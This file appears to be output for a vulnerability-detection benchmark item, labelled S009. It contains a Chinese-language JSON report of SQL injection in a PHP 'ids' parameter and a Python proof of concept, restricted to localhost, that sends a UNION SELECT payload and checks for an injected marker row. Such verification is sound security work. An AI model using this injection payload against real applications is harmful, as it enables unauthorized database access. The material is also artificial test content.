@@ -1,0 +1,131 @@
+```json
+{
+  "sample_id": "S009",
+  "prediction": "vulnerable",
+  "vulnerability_type": "SQL注入",
+  "locations": ["F01:0008", "F01:0013", "F01:0015"],
+  "evidence": {
+    "source": "F01:0008 读取外部可控的 GET 参数 ids：$idsRaw = trim($_GET['ids'] ?? '')；F01:0010-0013 非空后直接进入 SQL 构造。",
+    "flow": "F01:0013 将 $idsRaw 原样拼入 SELECT ... WHERE id IN ($idsRaw)；F01:0015 通过 $db->query($sql) 执行，入口到执行点在当前样本中可达。",
+    "guard": "无效：没有使用 mysqli_prepare/绑定参数，也没有对 ids 做整数列表白名单、类型过滤或 SQL 转义；F01:0038 的 htmlspecialchars 只保护 HTML 输出，不保护 SQL 结构。",
+    "sink": "F01:0015 执行拼接后的 SQL，ids 可改变 IN 列表甚至注入 UNION 等查询结构。"
+  },
+  "prerequisites": [
+    "本地页面可通过 http://127.0.0.1:4280 的实际部署入口访问",
+    "GET 参数 ids 可由请求者控制，且入口不需要未知会话令牌",
+    "$db 已按运行上下文连接到包含 lab_people 的 MariaDB/MySQLi 数据库",
+    "lab_people 预置记录为 1 Alice、2 Bob、3 Carol"
+  ],
+  "missing_context": [
+    "bootstrap.php 的具体实现和数据库账号权限未提供，不对其做实现猜测",
+    "页面在 127.0.0.1:4280 下的实际 HTTP 入口路径未提供，POC 需用 --path 指定",
+    "若实际部署要求登录或额外会话，需要补充该前提后才能运行验证"
+  ],
+  "poc_generated": true,
+  "poc_language": "python3",
+  "poc_instructions": "未执行；脚本仅用于本地验证。保存为 poc_s009.py，运行：python3 poc_s009.py --path /实际入口路径。脚本固定目标为 http://127.0.0.1:4280，拒绝非 / 开头路径、完整 URL 和重定向，不向外部发送数据。普通请求使用 ids=1,2，预期解析记录集合为 {('1','Alice'),('2','Bob')}；测试请求使用 ids=0) UNION SELECT 999,'POC_MARKER' -- ，预期解析记录额外包含 ('999','POC_MARKER')，且数据库不应新增记录。成功条件是比较解析后的实际记录集合差异，不以 HTTP 200 作为成功条件。失败时检查入口路径、bootstrap 数据库连接、lab_people 预置数据、认证要求、数据库权限与 SQL 模式。"
+}
+```
+
+```python
+import argparse
+import sys
+from html.parser import HTMLParser
+from urllib.error import HTTPError
+from urllib.parse import urlencode
+from urllib.request import Request, build_opener, HTTPRedirectHandler
+
+BASE = "http://127.0.0.1:4280"
+NORMAL_IDS = "1,2"
+TEST_IDS = "0) UNION SELECT 999,'POC_MARKER' -- "
+
+class NoRedirect(HTTPRedirectHandler):
+    def redirect_request(self, req, fp, code, msg, headers, newurl):
+        raise HTTPError(req.full_url, code, f"redirect refused: {newurl}", headers, fp)
+
+class LiParser(HTMLParser):
+    def __init__(self):
+        super().__init__(convert_charrefs=True)
+        self.in_li = False
+        self.buf = []
+        self.records = []
+
+    def handle_starttag(self, tag, attrs):
+        if tag.lower() == "li":
+            self.in_li = True
+            self.buf = []
+
+    def handle_data(self, data):
+        if self.in_li:
+            self.buf.append(data)
+
+    def handle_endtag(self, tag):
+        if tag.lower() == "li" and self.in_li:
+            text = "".join(self.buf).strip()
+            if "：" in text:
+                rid, name = text.split("：", 1)
+                self.records.append((rid.strip(), name.strip()))
+            self.in_li = False
+            self.buf = []
+
+def parse_records(html):
+    p = LiParser()
+    p.feed(html)
+    return p.records
+
+def fetch_records(path, ids):
+    url = BASE + path + "?" + urlencode({"ids": ids})
+    req = Request(url, headers={"User-Agent": "S009-local-poc"})
+    opener = build_opener(NoRedirect)
+    try:
+        with opener.open(req, timeout=5) as resp:
+            status = resp.status
+            body = resp.read().decode("utf-8", "replace")
+    except HTTPError as e:
+        raise RuntimeError(f"HTTP 错误或重定向被拒绝：{e.code}，URL={url}") from e
+    if status != 200:
+        raise RuntimeError(f"非 200 响应：{status}，URL={url}")
+    return parse_records(body)
+
+def main():
+    ap = argparse.ArgumentParser(description="S009 本地 SQL 注入验证脚本；目标固定为 127.0.0.1:4280")
+    ap.add_argument("--path", required=True, help="实际页面入口相对路径，例如 /入口文件.php；必须是 / 开头")
+    args = ap.parse_args()
+
+    if not args.path.startswith("/") or args.path.startswith("//") or "://" in args.path or "?" in args.path:
+        print("拒绝：--path 必须是单个本地入口相对路径，不能是完整 URL、协议相对路径或带查询串。", file=sys.stderr)
+        return 2
+
+    try:
+        normal = fetch_records(args.path, NORMAL_IDS)
+        test = fetch_records(args.path, TEST_IDS)
+    except Exception as e:
+        print(f"请求失败：{e}", file=sys.stderr)
+        print("请检查：入口路径、bootstrap 数据库连接、认证要求、lab_people 初始化、数据库权限。", file=sys.stderr)
+        return 2
+
+    normal_set = set(normal)
+    test_set = set(test)
+    expected_normal = {("1", "Alice"), ("2", "Bob")}
+    marker = ("999", "POC_MARKER")
+
+    print(f"普通请求 ids={NORMAL_IDS!r} 解析记录：{normal}")
+    print(f"测试请求 ids={TEST_IDS!r} 解析记录：{test}")
+
+    if normal_set != expected_normal:
+        print("普通业务对照失败：预期记录集合为 {('1','Alice'),('2','Bob')}。", file=sys.stderr)
+        print("请检查入口路径、数据库预置数据或页面输出格式。", file=sys.stderr)
+        return 2
+
+    if marker in test_set and marker not in normal_set and test_set != normal_set:
+        print("验证成功：测试请求解析记录集合出现普通请求之外的构造记录 ('999','POC_MARKER')。")
+        print("数据库观察：该验证只读 UNION，不应新增或修改 lab_people 记录。")
+        return 0
+
+    print("验证未成功：未观察到解析记录集合的预期差异。", file=sys.stderr)
+    print("请检查 SQL 模式、权限、URL 编码、入口是否使用同一段代码、是否存在额外过滤或认证。", file=sys.stderr)
+    return 1
+
+if __name__ == "__main__":
+    raise SystemExit(main())
+```
